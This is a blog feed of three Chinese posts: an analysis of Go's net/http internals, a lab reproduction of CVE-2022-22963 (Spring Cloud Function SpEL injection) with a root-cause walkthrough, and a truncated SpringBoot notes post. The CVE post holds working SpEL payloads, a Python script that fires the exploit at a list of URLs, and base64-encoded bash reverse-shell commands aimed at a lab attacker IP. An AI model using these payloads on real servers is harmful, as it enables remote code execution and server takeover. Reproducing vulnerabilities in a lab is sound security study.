实验前提","title":"DDos"},{"content":"很长时间没有水博客了，前些天学习了一下go的语法。go凭借其轻量级和并发性的原因，性能越来越优异，这里简单分析一下如何通过go原生的http开启一个web服务，并对其过程进行一定的剖析。\n[TOC]\ngo原生的web服务搭建 Go 语言里面提供了一个完善的 net/http 包，通过 http 包可以很方便的就搭建起来一个可以运行的 Web 服务。同时使用这个包能很简单地对 Web 的路由，静态文件，模版，cookie 等数据进行设置和操作。\n比如说，给定代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;log\u0026#34; ) func sayhelloName(w http.ResponseWriter, r *http.Request) { r.ParseForm() // 解析参数，默认是不会解析的 fmt.Println(r.Form) // 这些信息是输出到服务器端的打印信息 fmt.Println(\u0026#34;path\u0026#34;, r.URL.Path) fmt.Println(\u0026#34;scheme\u0026#34;, r.URL.Scheme) fmt.Println(r.Form[\u0026#34;url_long\u0026#34;]) for k, v := range r.Form { fmt.Println(\u0026#34;key:\u0026#34;, k) fmt.Println(\u0026#34;val:\u0026#34;, strings.Join(v, \u0026#34;\u0026#34;)) } fmt.Fprintf(w, \u0026#34;Hello astaxie!\u0026#34;) // 这个写入到 w 的是输出到客户端的 } func main() { http.HandleFunc(\u0026#34;/\u0026#34;, sayhelloName) // 设置访问的路由 err := http.ListenAndServe(\u0026#34;:9090\u0026#34;, nil) // 设置监听的端口 if err != nil { log.Fatal(\u0026#34;ListenAndServe: \u0026#34;, err) } } 通过此，我们可以通过http包下面的两个函数HandleFunc和ListenAndServer函数可以开启一个web服务器。并且在HandleFunc中我们可以指定我们该路由下面的处理方法。 http包执行流程 如图，为Go实现Web服务的流程图。\n1、在服务器端创建一个Listen Socket ，监听指定的端口，等到客户端访问 2、Listen Socket接收到客户端accept,就会生成一个Client Socket,之后所有的会话都由Client Socket 于 客户端通信。 3、建立连接后，处理客户端的请求时。首先从 Client Socket 读取 HTTP 请求的协议头，如果是 POST 方法，还可能要读取客户端提交的数据，然后交给相应的 handler 处理请求，handler 处理完毕准备好客户端需要的数据，通过 Client Socket 写给客户端。(这里的handler即为我们自定义的函数) 如何监听端口 Go 是通过一个函数 ListenAndServe 来处理这些事情的，这个底层其实这样处理的：初始化一个 server 对象，然后调用了 net.Listen(\u0026ldquo;tcp\u0026rdquo;, addr)，也就是底层用 TCP 协议搭建了一个服务，然后监控我们设置的端口。\n我们通过查看ListenAndServe可以看到,确实如此。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 func (srv *Server) ListenAndServe() error { if srv.shuttingDown() { return ErrServerClosed } addr := srv.Addr if addr == \u0026#34;\u0026#34; { addr = \u0026#34;:http\u0026#34; } ln, err := net.Listen(\u0026#34;tcp\u0026#34;, addr) if err != nil { return err } return srv.Serve(ln) } 处理请求 然后，建立监控之后，go通过srv.Server(ln)方法来实现\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 func (srv *Server) Serve(l net.Listener) error { if fn := testHookServerServe; fn != nil { fn(srv, l) // call hook with unwrapped listener } origListener := l l = \u0026amp;onceCloseListener{Listener: l} defer l.Close() if err := srv.setupHTTP2_Serve(); err != nil { return err } if !srv.trackListener(\u0026amp;l, true) { return ErrServerClosed } defer srv.trackListener(\u0026amp;l, false) baseCtx := context.Background() if srv.BaseContext != nil { baseCtx = srv.BaseContext(origListener) if baseCtx == nil { panic(\u0026#34;BaseContext returned a nil context\u0026#34;) } } var tempDelay time.Duration // how long to sleep on accept failure ctx := context.WithValue(baseCtx, ServerContextKey, srv) for { rw, err := l.Accept() if err != nil { select { case \u0026lt;-srv.getDoneChan(): return ErrServerClosed default: } if ne, ok := err.(net.Error); ok \u0026amp;\u0026amp; ne.Temporary() { if tempDelay == 0 { tempDelay = 5 * time.Millisecond } else { tempDelay *= 2 } if max := 1 * time.Second; tempDelay \u0026gt; max { tempDelay = max } srv.logf(\u0026#34;http: Accept error: %v; retrying in %v\u0026#34;, err, tempDelay) time.Sleep(tempDelay) continue } return err } connCtx := ctx if cc := srv.ConnContext; cc != nil { connCtx = cc(connCtx, rw) if connCtx == nil { panic(\u0026#34;ConnContext returned nil\u0026#34;) } } tempDelay = 0 c := srv.newConn(rw) c.setState(c.rwc, StateNew, runHooks) // before Serve can return go c.serve(connCtx) } } 这个函数就是用来处理客户端的请求信息。里面有一个for循环，通过Listener接收数据，然后创建一个Conn,最后通过go c.server()来保证高并发，使用户的每一次请求都在一个新的goroutine去服务，相互不影响。\n分配函数处理请求 在c.server()中，对请求做一下处理，找到对应的handler\n1 2 w, err := c.readRequest(ctx) serverHandler{c.server}.ServeHTTP(w, w.req) conn 首先会解析 request:c.readRequest(), 然后获取相应的 handler:handler := c.server.Handler，也就是我们刚才在调用函数 ListenAndServe 时候的第二个参数。\n进一步查看ServerHTTP如何找到对应的Handler\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 func (sh serverHandler) ServeHTTP(rw ResponseWriter, req *Request) { handler := sh.srv.Handler if handler == nil { handler = DefaultServeMux } if req.RequestURI == \u0026#34;*\u0026#34; \u0026amp;\u0026amp; req.Method == \u0026#34;OPTIONS\u0026#34; { handler = globalOptionsHandler{} } if req.URL != nil \u0026amp;\u0026amp; strings.Contains(req.URL.RawQuery, \u0026#34;;\u0026#34;) { var allowQuerySemicolonsInUse int32 req = req.WithContext(context.WithValue(req.Context(), silenceSemWarnContextKey, func() { atomic.StoreInt32(\u0026amp;allowQuerySemicolonsInUse, 1) })) defer func() { if atomic.LoadInt32(\u0026amp;allowQuerySemicolonsInUse) == 0 { sh.srv.logf(\u0026#34;http: URL query contains semicolon, which is no longer a supported separator; parts of the query may be stripped when parsed; see golang.org/issue/25192\u0026#34;) } }() } handler.ServeHTTP(rw, req) } 我们前面例子传递的是 nil，也就是为空，那么默认获取 handler = DefaultServeMux, 这个变量就是一个路由器，它用来匹配 url 跳转到其相应的 handle 函数，我们通过调用http.HandleFunc(\u0026quot;/\u0026quot;, sayhelloName) 来生成一个handler。这个作用就是注册了请求 / 的路由规则，当请求 uri 为 \u0026ldquo;/\u0026quot;，路由就会转到函数 sayhelloName，DefaultServeMux 会调用 ServeHTTP 方法，这个方法内部其实就是调用 sayhelloName 本身，最后通过写入 response 的信息反馈到客户端。\nServeMux的自定义 上面讲述传入的handler为nil的时候，就会调用http默认的路由器，通过路由器将请求传递到后端处理函数。\n结构如下：\n1 2 3 4 5 type ServeMux struct { mu sync.RWMutex // 锁，由于请求涉及到并发处理，因此这里需要一个锁机制 m map[string]muxEntry // 路由规则，一个 string 对应一个 mux 实体，这里的 string 就是注册的路由表达式 hosts bool // 是否在任意的规则中带有 host 信息 } 下面看一下啊muxEntry:\n1 2 3 4 5 type muxEntry struct { explicit bool // 是否精确匹配 h Handler // 这个路由表达式对应哪个 handler pattern string // 匹配字符串 } 接着看一下 Handler :\n1 2 3 type Handler interface { ServeHTTP(ResponseWriter, *Request) // 路由实现器 } 下图是通过debug获取的封装到默认路由器的信息。\n详细介绍一下如何将我们传入的函数封装为我们路由对应的handler。\n首先，在http包里面定义一个类型HandleFunc，我们定义的函数sayhelloName就是其调用之后的结果，这个类型默认就实现了 ServeHTTP 这个接口，即我们调用了 HandlerFunc (f), 强制类型转换 f 成为 HandlerFunc 类型，这样 f 就拥有了 ServeHTTP 方法。\n1 2 3 4 5 6 7 type HandlerFunc func(ResponseWriter, *Request) // ServeHTTP calls f(w, r). func (f HandlerFunc) ServeHTTP(w ResponseWriter, r *Request) { f(w, r) } 1 2 3 4 5 6 7 8 // HandleFunc registers the handler function for the given pattern. func (mux *ServeMux) HandleFunc(pattern string, handler func(ResponseWriter, *Request)) { if handler == nil { panic(\u0026#34;http: nil handler\u0026#34;) } // 将f()类型强转化为`HandleFunc` mux.Handle(pattern, HandlerFunc(handler)) } 这样路由器就存储了对应的路由规则，默认路由器的ServeHTTP如下：\n1 2 3 4 5 6 7 8 9 func (mux *ServeMux) ServeHTTP(w ResponseWriter, r *Request) { if r.RequestURI == \u0026#34;*\u0026#34; { w.Header().Set(\u0026#34;Connection\u0026#34;, \u0026#34;close\u0026#34;) w.WriteHeader(StatusBadRequest) return } h, _ := mux.Handler(r) h.ServeHTTP(w, r) } 如果传入URI为*,那么就关闭链接，否则调用mux.Handler(r)，返回我们设置路由的Handler,然后调用他的ServerHTTP(w,r) 分析一下，如何通过mux.Handler(r)来找到我们对应的路由\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 func (mux *ServeMux) Handler(r *Request) (h Handler, pattern string) { // 判断方法是否为CONNECT if r.Method != \u0026#34;CONNECT\u0026#34; { if p := cleanPath(r.URL.Path); p != r.URL.Path { _, pattern = mux.handler(r.Host, p) return RedirectHandler(p, StatusMovedPermanently), pattern } } // 不是CONNECT的话，就调用自己的hanlder return mux.handler(r.Host, r.URL.Path) } func (mux *ServeMux) handler(host, path string) (h Handler, pattern string) { mux.mu.RLock() defer mux.mu.RUnlock() // 通过host + path 在mu中匹配自己的handler // Host-specific pattern takes precedence over generic ones if mux.hosts { h, pattern = mux.match(host + path) } if h == nil { h, pattern = mux.match(path) } if h == nil { h, pattern = NotFoundHandler(), \u0026#34;\u0026#34; } return } 发现其是根据用户请求的 URL 和路由器里面存储的 map 去匹配的，当匹配到之后返回存储的 handler，调用这个 handler 的 ServeHTTP 接口就可以执行到相应的函数了。\nA 判断是否有路由能满足这个 request（循环遍历 ServeMux 的 muxEntry） B 如果有路由满足，调用这个路由 handler 的 ServeHTTP C 如果没有路由满足，调用 NotFoundHandler 的 ServeHTTP ","permalink":"http://www.reus09.top/posts/tech/go%E5%8E%9F%E7%94%9Fnet%E5%8C%85%E5%88%86%E6%9E%90/","summary":"很长时间没有水博客了，前些天学习了一下go的语法。go凭借其轻量级和并发性的原因，性能越来越优异，这里简单分析一下如何通过go原生的http","title":"Go原生net包分析"},{"content":"漏洞介绍 Spring Cloud Function 是基于 Spring Boot 的函数计算框架。该项目致力于促进函数为主的开发单元，它抽象出所有传输细节和基础架构，并提供一个通用的模型，用于在各种平台上部署基于函数的软件。 由于Spring Cloud Function存在SpEL表达式注入漏洞。远程攻击者无需认证即可构造特定的数据包，并通过特定的 HTTP 请求头注入 SpEL 表达式。最终可导致远程执行任意代码，获取服务器权限。 风险等级：高风险 漏洞风险：攻击者利用该漏洞可导致远程执行任意代码，获取服务器权限 影响版本 Spring Cloud Function =\u0026lt; 3.1.6 Spring Cloud Function =\u0026lt; 3.2.2 安全版本 Spring Cloud Function \u0026gt;= 3.1.7 Spring Cloud Function \u0026gt;= 3.2.3 SpringCloud Function介绍 SpringCloud 是一套分布式系统的解决方案，常见的还有阿里巴巴的Dubbo，Fass（Function As A Service ）的底层实现就是函数式编程，在视频转码、音视频转换、数据仓库ETL等与状态相关度低的领域运用的比较多。开发者无需关注服务器环境运维等问题上，专注于自身业务逻辑实现即可。 SpringCloud Function 就是Spring提供的分布式函数式编程组件。 漏洞环境搭建 通过idea新建一个Spring项目，pom中引入spring-boot-starter-web、spring-cloud-function-web，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;io.spring.sample\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;function-sample-pojo\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1.RELEASE\u0026lt;/version\u0026gt; \u0026lt;packaging\u0026gt;jar\u0026lt;/packaging\u0026gt; \u0026lt;name\u0026gt;function-sample-pojo\u0026lt;/name\u0026gt; \u0026lt;description\u0026gt;Spring Cloud Function Web Support\u0026lt;/description\u0026gt; \u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-parent\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.0-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;relativePath/\u0026gt; \u0026lt;/parent\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;spring-cloud-function.version\u0026gt;3.2.1-SNAPSHOT\u0026lt;/spring-cloud-function.version\u0026gt; \u0026lt;wrapper.version\u0026gt;1.0.27.RELEASE\u0026lt;/wrapper.version\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-function-webflux\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-configuration-processor\u0026lt;/artifactId\u0026gt; \u0026lt;optional\u0026gt;true\u0026lt;/optional\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-test\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;dependencyManagement\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-function-dependencies\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${spring-cloud-function.version}\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/dependencyManagement\u0026gt; \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-deploy-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;skip\u0026gt;true\u0026lt;/skip\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot.experimental\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-thin-layout\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${wrapper.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;artifactId\u0026gt;maven-surefire-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;includes\u0026gt; \u0026lt;include\u0026gt;**/*Tests.java\u0026lt;/include\u0026gt; \u0026lt;include\u0026gt;**/*Test.java\u0026lt;/include\u0026gt; \u0026lt;/includes\u0026gt; \u0026lt;excludes\u0026gt; \u0026lt;exclude\u0026gt;**/Abstract*.java\u0026lt;/exclude\u0026gt; \u0026lt;/excludes\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; \u0026lt;repositories\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;spring-snapshots\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Snapshots\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-snapshot-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;releases\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/releases\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;spring-milestones\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Milestones\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-milestone-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;spring-releases\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Releases\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/release\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;/repositories\u0026gt; \u0026lt;pluginRepositories\u0026gt; \u0026lt;pluginRepository\u0026gt; \u0026lt;id\u0026gt;spring-snapshots\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Snapshots\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-snapshot-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;releases\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/releases\u0026gt; \u0026lt;/pluginRepository\u0026gt; \u0026lt;pluginRepository\u0026gt; \u0026lt;id\u0026gt;spring-milestones\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Milestones\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-milestone-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/pluginRepository\u0026gt; \u0026lt;pluginRepository\u0026gt; \u0026lt;id\u0026gt;spring-releases\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Releases\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-release-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/pluginRepository\u0026gt; \u0026lt;/pluginRepositories\u0026gt; \u0026lt;/project\u0026gt; 建立一个配置类，用于实现字符串小写\n在applications.properties中写入spring.cloud.function.definition:functionRouter\n如果设置为functionRouter则默认路由绑定的具体函数交由用户进行控制，在 Spring Cloud Function Web里面，可以通过设置http头的方式来控制，使用spring.cloud.function.definition 和spring.cloud.function.routing-expression 都可以，区别是后者允许使用Spring表达式语言（SpEL）。 开启8090端口\n漏洞复现 在HTTP请求头加入spring.cloud.function.routing-expression:\npayload:spring.cloud.function.routing-expression: new ProcessBuilder('/System/Applications/Calculator.app/Contents/MacOS/Calculator').start()\n同时也可以通过T(java.lang.Runtime).getRuntime().exec(\u0026quot;cmd\u0026quot;)来执行任意命令执行\n但是这种命令执行没有回显。 exp脚本\nexp实际上就是封装好我们我们需要发送的数据包，带上我们的恶意参数头。 实际上，这个exp也可以执行其他命令，只需要更改发送数据包的payload即可，下面的反弹shell就会用到该脚本。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 import requests import sys import threading import urllib3 urllib3.disable_warnings() def scan(txt,cmd): # payload1=f\u0026#39;T(java.lang.Runtime).getRuntime().exec(\u0026#34;{cmd}\u0026#34;)\u0026#39; payload = \u0026#34;new ProcessBuilder(\u0026#39;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#39;).start()\u0026#34; data =\u0026#39;test\u0026#39; headers = { \u0026#39;spring.cloud.function.routing-expression\u0026#39;:payload, \u0026#39;Accept-Encoding\u0026#39;: \u0026#39;gzip, deflate\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;*/*\u0026#39;, \u0026#39;Accept-Language\u0026#39;: \u0026#39;en\u0026#39;, \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39; } path = \u0026#39;/functionRouter\u0026#39; f = open(txt) urllist=f.readlines() for url in urllist : url = url.strip(\u0026#39;\\n\u0026#39;) all = url + path try: req=requests.post(url=all,headers=headers,data=data,verify=False,timeout=3) code =req.status_code text = req.text rsp = \u0026#39;\u0026#34;error\u0026#34;:\u0026#34;Internal Server Error\u0026#34;\u0026#39; if code == 500 and rsp in text: print ( f\u0026#39;[+] { url } is vulnerable\u0026#39; ) poc_file = open(\u0026#39;vulnerable.txt\u0026#39;, \u0026#39;a+\u0026#39;) poc_file.write(url + \u0026#39;\\n\u0026#39;) poc_file.close() else: print ( f\u0026#39;[-] { url } not vulnerable\u0026#39; ) except requests.exceptions.RequestException: print ( f\u0026#39;[-] { url } detection timed out\u0026#39; ) continue except: print ( f\u0026#39;[-] { url } error\u0026#39; ) continue if __name__ == \u0026#39;__main__\u0026#39; : try: cmd1 =sys.argv[1] t = threading . Thread ( target = scan ( cmd1 , \u0026#39;whoami\u0026#39; ) ) t.start() except: print ( \u0026#39;Usage:\u0026#39; ) print(\u0026#39;python poc.py url.txt\u0026#39;) 这里我们需要将我们需要进行cve执行的ip都存放到一个文件夹(比如ip.txt)里面 执行的时候调用python3 exp.py ip.txt即可 反弹shell 我们可以通过反弹shell拿到稳定的shell 本地实现 这里是通过本机的两个端口实现。\n命令准备\n1 2 3 4 反弹shell命令： bash -i \u0026gt;\u0026amp; /dev/tcp/127.0.0.1/8899 0\u0026gt;\u0026amp;1 base64加密： bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg5OSAwPiYx}|{base64,-d}|{bash,-i} 修改数据包后，发送数据包：\n同时在本机用nc -l 8899 监听8899发送来的信息。\n数据包发送完毕之后 由此拿到稳定的shell https://blog.csdn.net/xhwfa/article/details/124307153 两个虚拟机实现 靶机：ubuntu 18 : IP:192.168.195.133\n攻击机:kali linux : IP:192.168.195.131\n在攻击机开启nc -lvvp 8899对8899端口进行监听\n同时攻击机对exp脚本进行运行\n拿到shell\nexp脚本：\n即为将上面的通用脚本里面的payload改写一下即可\n1 payload = \u0026#39;T(java.lang.Runtime).getRuntime().exec(\u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjczLjEzMS84ODk5IDA+JjE=}|{base64,-d}|{bash,-i}\u0026#34;)\u0026#39; 原理分析 根据漏洞原理及官方测试用例可以知晓漏洞触发点在http header中spring.cloud.function.routing-expression字段。\n在命令执行出下断点，看下程序执行流程。\nSpringCloud Function之所以能自动将函数建立http端点，是因为在包mvc.FunctionController中使用/** 监听了get/post类型的所有端点。\n1、当一个请求进入时，程序首先基于Springboot的自动配置，调用处理器，随后将以“WebRequestConstants.handler”为key，function为值添加到request数组里面。\n2、根据上述分析，我们发现对数据包封装好之后，我们都需要调用函数processRequest，我们直接在processRequest打断点\n可以发现wrapper封装的即为我们的HTTP头 同时查看参数function,发现其functionDefinition为functionRouter 如果设置为functionRouter则默认路由绑定的具体函数交由用户进行控制，在 Spring Cloud Function Web里面，可以通过设置http头的方式来控制，使用spring.cloud.function.definition 和spring.cloud.function.routing-expression 都可以，区别是后者允许使用Spring表达式语言（SpEL）。 3、通过判断后执行function的apply方法\n然后在apply中执行doaply方法\n4、判断是不是functionRouter方法，判断当前的类型，是RouteFunction或者Composed直接跳转到else，执行自己的apply方法，这里是functionRouter，我们直接就执行funtionRouter的apply方法\n发现在functionRouter的apply方法中实际上调用的是route方法 5、分析route方法\n因为function为null,直接进入if-else\n可以看到程序检查headers参数中是否有“spring.cloud.function.definition”或者“spring.cloud.function.routing-expression“字段，并进行相应的处理。如果是spring.cloud.function.routing-expression ，则调用 functionFromExpression()方法处理。\n6、跟进到functionFromExpression方法中，参数中routingExpression，可以看一下该参数为T(java.lang.Runtime).getRuntime().exec(\u0026quot;whoami\u0026quot;)，也就是header中传入的。传入后由spelParser.parseExpression（）处理。\n7、漏洞也就是在这里SpEL表达式解析，进行触发。\n","permalink":"http://www.reus09.top/posts/tech/cve-2022-22963/","summary":"漏洞介绍 Spring Cloud Function 是基于 Spring Boot 的函数计算框架。该项目致力于促进函数为主的开发单元，它抽象出所有传输细节和基础架构，并提供一个通用的模型，用于在各种","title":"CVE-2022-22963漏洞复现"},{"content":" 因为之前接触了一点ssm，所以这里简单的学习了springboot的一些简单用法，具体的源码分析以后有时间的话慢慢分析 这里简单谈一下springboot的简单了解，springboot实际上是把ssm、web服务器比如tomcat,jetty、mysql或者nosql各个框架整合到一起的产物，使用springboot实际上简化了各个框架的组合使用。 springboot中加载支持的配置的依赖一般以springboot-starter-xxx 非官方支持的第三方依赖命名：xxx-springboot-starter-xxx SpringBoot默认会在底层配好所有的组件。但是如果用户自己配置了以用户的优先 学习可以通过springboot提供的官方文档 这里给出2.5.13版本的官方文档链接 https://docs.spring.io/spring-boot/docs/2.5.13/reference/html/ 1 配置使用 application.properties和application.yaml 2 注解使用 因为springboot集成了springmvc和spring，也组合了其许多的注解 @SpringBootApplication 1 2 3 4 5 @SpringBootApplication 等同于 @SpringBootConfiguration @EnableAutoConfiguration @ComponentScan(\u0026#34;com.reus.boot\u0026#34;) @SpringBootConfiguration @Configuration。代表当前是一个配置类 @EnableAutoConfiguration 1 2 3 @AutoConfigurationPackage @Import(AutoConfigurationImportSelector.class) public @interface EnableAutoConfiguration {} @EnableAutoConfiguration集成了两个注解\n@AutoConfigurationPackage\n自动配置包,指定了默认的包规则\n1 2 3 4 5 @Import(AutoConfigurationPackages.Registrar.class) //给容器中导入一个组件 public @interface AutoConfigurationPackage {} //利用Registrar给容器中导入一系列组件 //将指定的一个包下的所有组件导入进来？MainApplication 所在包下。 实际上将我们自己编写的在默认包中的组件加入到容器中\n@Import(AutoConfigurationImportSelector.class)\n1 2 3 4 5 6 1、利用getAutoConfigurationEntry(annotationMetadata);给容器中批量导入一些组件 2、调用List\u0026lt;String\u0026gt; configurations = getCandidateConfigurations(annotationMetadata, attributes)获取到所有需要导入到容器中的配置类 3、利用工厂加载 Map\u0026lt;String, List\u0026lt;String\u0026gt;\u0026gt; loadSpringFactories(@Nullable ClassLoader classLoader)；得到所有的组件 4、从META-INF/spring.factories位置来加载一个文件。 默认扫描我们当前系统里面所有META-INF/spring.factories位置的文件 spring-boot-autoconfigure-2.3.4.RELEASE.jar包里面也有META-INF/spring.factories 这里是加载springboot给我们提供的该项目需要绑定的默认组件。 @ComponentScan(\u0026quot;com.reus.boot\u0026quot;) 指定扫描哪些，Spring注解；指定扫描那些包 @Configuration 告诉容器这是一个配置类\n基本使用 Full模式与Lite模式 示例 最佳实战 配置 类组件之间无依赖关系用Lite模式加速容器启动过程，减少判断 配置类组件之间有依赖关系，方法会被调用得到之前单实例组件，用Full模式 配置类里面使用@Bean标注在方法上给容器注册组件，默认也是单实例的 配置类本身也是组件 proxyBeanMethods：代理bean的方法 Full(proxyBeanMethods = true)、【保证每个@Bean方法被调用多少次返回的组件都是单实例的】 Lite(proxyBeanMethods = false)【每个@Bean方法被调用多少次返回的组件都是新创建的】 组件依赖必须使用Full模式默认。其他默认是否Lite模式 @Conditional 条件装配：满足Conditional指定的条件，则进行组件注入 作用在组件上，如果满足注解的contional条件就生效，否则就不生效 @ConfigurationProperties 法一 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 